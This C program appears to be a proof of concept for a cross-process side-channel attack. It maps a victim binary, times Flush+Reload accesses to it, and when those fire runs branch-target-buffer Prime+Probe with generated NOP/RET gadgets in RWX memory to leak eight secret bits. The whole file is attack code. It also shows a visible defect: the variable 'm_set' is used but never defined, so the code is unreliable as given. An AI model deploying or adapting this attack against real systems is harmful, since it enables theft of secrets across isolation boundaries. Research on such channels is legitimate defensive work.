#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <assemblyline.h>
#include <time.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#define HIGH_MASK 1ULL << 45
#define LOW_MASK  0x7FFFFFFFF000
#define memory_barrier asm volatile (".rept 1;\nsfence;\nmfence;\nlfence\n.endr");
#define NUM_OF_PRIME 8

void *map(const char *elf_path, unsigned long *size);
int dummy;
void delayloop(uint64_t cycles);
volatile int running = 1;
void handler(int x){
    running = 0;
}

void *create_buffer(uint64_t adrs, int size);
void *create_prime_set(uint64_t btb_set, int size);
void *create_probe_set(uint64_t btb_set, int size);

void (*prime_set[NUM_OF_PRIME])(), (*probe_set[NUM_OF_PRIME])();
uint64_t monitor_address[NUM_OF_PRIME];
uint64_t overall_time = 0;
int pp_results[1024];
uint64_t fr_detect[1024];



int main(int argc, char *argv[])
{
  signal(SIGINT, handler);
  int hits = 0;

  // Map victim into attacker userspace
  unsigned long size;
  char *binary = map(argv[1], &size);

  // Points to access_variable in victim 
  void * victim_probe = binary + (0x4000 & (~0x3f));

  // Generate prime, probe, monitor set
  uint64_t btb_set =  ((uint64_t)(0x5555555f0680 + 0x437) >> 5) & 0x1FF;
  for (int i = 0; i < NUM_OF_PRIME; i++) {
      prime_set[i] = create_prime_set(btb_set, 4096);
      probe_set[i] = create_probe_set((uint64_t)(prime_set[i]), 4096);
      monitor_address[i] = (uint64_t)(probe_set[i]) + m_set * 64;
  }

  memory_barrier

  while (running) {
    uint64_t start = __rdtscp(&dummy);
    asm volatile("mov (%0), %%eax":: "r"(victim_probe));
    start = __rdtscp(&dummy) - start;
        
    // Trigger prime+probe
    if (start <= 100) {
      fr_detect[hits] = __rdtscp(&dummy);

      for (int i = 0; i < NUM_OF_PRIME + 2; i++) {
        prime_set[i % NUM_OF_PRIME]();
        memory_barrier
      }

      memory_barrier
      /****
	Configure the waiting cycles to get better results.
      ******/
      delayloop(1800);

      for (int i = 0; i < NUM_OF_PRIME; i++) {
        probe_set[i]();
        memory_barrier
      }

      uint64_t time_probe = __rdtscp(&dummy);
      asm volatile("mov (%0), %%eax":: "r"((void *)monitor_address[2]));
      time_probe = __rdtscp(&dummy) - time_probe;
      overall_time += time_probe > 100 ? 1 : 0;
      pp_results[hits] = time_probe > 100 ? 1 : 0;
      memory_barrier
      hits++;
    }

      asm volatile("clflush 0(%0);\nmfence":: "r"(victim_probe));
      asm volatile("clflush 0(%0)":: "r"((void *)monitor_address[2]));
        
      memory_barrier
      delayloop(1000);
    }

    if (hits != 8) {
      return 1;
    }
    uint8_t secret = 0;
    for (int i = 0; i < 8; i++) {
      secret |= (pp_results[i] << i);
      printf("%d ", pp_results[i]);
    }
    printf("\n");
}

void *map(const char *elf_path, unsigned long *size)
{
    int fd = open(elf_path, O_RDONLY);
    if (fd < 0 ) {
        perror("Error opening ELF file.");
        exit(EXIT_FAILURE);
    }

    struct stat st_buf;
    fstat(fd, &st_buf);
    *size = st_buf.st_size;

    void *rv = mmap(NULL, *size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (rv == MAP_FAILED) {
        perror("Error mapping ELF file.");
        exit(EXIT_FAILURE);
    }
    close(fd);
    return rv;
}


void *create_prime_set(uint64_t btb_set, int size)
{
    int i;
    uint64_t adrs = (((uint64_t)rand() << 32) | rand()) & ~(0x1FFULL << 5) | (btb_set << 5);
    void *buffer = create_buffer(adrs, size);

    assemblyline_t al = asm_create_instance(buffer, size);

    asm_assemble_str(al, "JMP 832");

    for (i = 0; i < 832; i++)
	    asm_assemble_str(al, "NOP");

    // align RET into next btb set
    for (i = 0; i < 64; i++)
        asm_assemble_str(al, "NOP");
    asm_assemble_str(al, "RET");

    void (*func)() = asm_get_code(al);
    asm_destroy_instance(al);
    return func;
}

void *create_probe_set(uint64_t adrs, int size)
{
    int i;

    adrs = ((((uint64_t)rand() << 32) | rand()) & (~0xFFFFFFFFULL)) | (adrs & 0xFFFFFFFFULL);
    void *buffer = create_buffer((adrs & LOW_MASK), size);

    assemblyline_t al = asm_create_instance(buffer, size);

    for (i = 0; i < 32; i++)
	    asm_assemble_str(al, "NOP");

    asm_assemble_str(al, "RET");

    void (*func)() = asm_get_code(al);
    asm_destroy_instance(al);
    return func;
}

void *create_buffer(uint64_t adrs, int size)
{
    void* buffer = (void*)mmap( (void*)(adrs & LOW_MASK), size,
			    PROT_READ | PROT_WRITE | PROT_EXEC,
			    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE | MAP_POPULATE,
			    -1, 0);
    if (buffer == MAP_FAILED) {
        printf("Fail to allocate memory\n");
        exit(1);
    }
    return buffer;
}

void delayloop(uint64_t cycles)
{
    uint64_t start = __rdtscp(&dummy);
    while ((__rdtscp(&dummy) - start) < cycles)
	asm volatile ("" :::"memory");
}
